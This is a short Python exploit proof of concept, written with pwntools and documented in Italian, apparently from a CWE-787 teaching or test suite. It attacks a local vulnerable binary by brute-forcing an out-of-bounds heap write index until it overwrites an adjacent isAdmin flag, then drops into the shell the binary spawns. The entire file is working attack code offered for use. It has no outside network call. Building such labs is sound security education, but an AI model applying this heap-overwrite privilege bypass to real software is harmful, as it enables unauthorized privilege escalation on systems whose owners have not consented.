"""
@file CWE-787 Heap OOB Write Logic Bypass Exploit.py
@brief Exploit PoC per CWE-787
Target: CWE-787 Heap OOB Write

Descrizione:
Esegue brute-force dell'indice per trovare l'offset corretto relativo all'allocazione
di `WidgetList` e sovrascrivere la variabile `isAdmin` della struttura `AdminSession`
adiacente nell'heap.
"""

# Exploit for vuln5: Heap OOB Write (Bypass Admin)
from pwn import *
import os

binary_path = os.path.abspath('../build/CWE-787 Heap OOB Write')
if len(sys.argv) > 1:
    binary_path = os.path.abspath(sys.argv[1])
elf = ELF(binary_path, checksec=False)
context.binary = elf

log.info("Starting exploit for vuln5 (OOB Write -> Logic Bypass)...")


found = False
for idx in range(4, 20):
    log.info(f"Probable index {idx}...")
    p = process([binary_path, str(idx)])
    try:
       
        p.recvuntil(b"Writing")
        
     
        output = p.recv(timeout=0.2)
        if b"Spawning Shell" in output:
            log.success(f"SUCCESS! Admin bypass at index {idx}")
            log.info("Switching to interactive mode...")
            p.interactive()
            found = True
            break
        else:
            p.close()
    except: 
        p.close()

if not found:
    log.failure("Could not determine correct offset. Heap layout might differ.")
